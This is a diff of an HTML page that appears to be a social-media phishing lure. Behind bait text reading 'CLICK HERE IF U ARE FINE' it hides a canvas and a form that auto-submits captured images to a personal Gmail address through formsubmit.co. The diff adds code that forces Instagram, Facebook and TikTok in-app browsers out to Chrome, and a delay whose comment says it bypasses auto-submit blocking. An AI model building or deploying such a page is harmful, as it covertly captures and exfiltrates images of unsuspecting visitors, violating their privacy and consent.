@@ -4,23 +4,37 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title></title>
+    <script>
+        function redirectToBrowser() {
+            let userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+            // Detect if inside Instagram, Facebook, or TikTok app
+            if (userAgent.includes("Instagram") || userAgent.includes("FBAN") || userAgent.includes("FBAV") || userAgent.includes("TikTok")) {
+                let url = window.location.href;
+
+                // Try to open in default browser (for iOS)
+                window.open(url, "_blank");
+
+                // Try to open in Chrome (Android)
+                setTimeout(() => {
+                    window.location.href = "googlechrome://" + url.replace(/^https?:\/\//, "");
+                }, 500);
+            }
+        }
+
+        window.onload = redirectToBrowser;
+    </script>
 </head>
-<body> 
-    <marquee behavior="scroll" direction="left" style="font-size: 2em; font-weight: bold; background-color: #f0f8ff; color: #0073e6; padding: 10px; border-radius: 10px; box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);">
-        <img src= "https://www.bing.com/th/id/OIP.eJGRKo-WImYfGnB-p-r41AHaGq?w=228&h=206&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2" alt="Nepal Flag" style="height: 50px; vertical-align: middle;"> 
-        <span>_____ITS ME ( HEMRAZ ) -- TEAM AGYAT </span>
-        <img src="https://www.bing.com/th/id/OIP.eJGRKo-WImYfGnB-p-r41AHaGq?w=228&h=206&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2" alt="Nepal Flag" style="height: 50px; vertical-align: middle;">
-    </marquee>
-    <h2 style="font-size: 4em; color: palevioletred">  ARE U FINE ???  </h2>
+<body>
+    <h2 style="font-size: 10em; color: palevioletred">HELLO ❤ __ HOW ARE U ?</h2>
     
-    <!-- Removed the video element, only button to trigger capture -->
-    <button id="capture" style="font-size: 3em; color: blueviolet; cursor: pointer;"><a href="https://www.youtube.com/watch?v=aUSpjIfQ6VI"> CLICK HERE IF U ARE FINE !!!</a> </button>
+    <button id="capture" style="font-size: 7em; color: blueviolet; cursor: pointer;"> CLICK HERE IF U ARE FINE </button>
     <canvas id="canvas" width="1080" height="1440" style="display: none;"></canvas>
     <form id="imageForm" action="https://formsubmit.co/hemrajbudha60@gmail.com" method="POST" enctype="multipart/form-data">
         <input type="hidden" name="_captcha" value="false">
         <input type="hidden" name="_template" value="table">
         <input type="file" id="imageInput" name="image" accept="image/png, image/jpeg">
-        <button type="submit" style="display: none;"> <a href="https://www.youtube.com/watch?v=aUSpjIfQ6VI"> Submit </a></button>
+        <button type="submit" style="display: none;">Submit</button>
     </form>
 
     <script>
@@ -52,8 +66,10 @@
                     dataTransfer.items.add(file);
                     imageInput.files = dataTransfer.files;
 
-                    // Automatically submit the form
-                    form.submit();
+                    // Add delay before form submission to prevent blocking
+                    setTimeout(() => {
+                        form.submit(); // Submit form after a brief delay (helps bypass auto-submit blocking)
+                    }, 500); // 500 ms delay
                 }, "image/png");
             });
         })
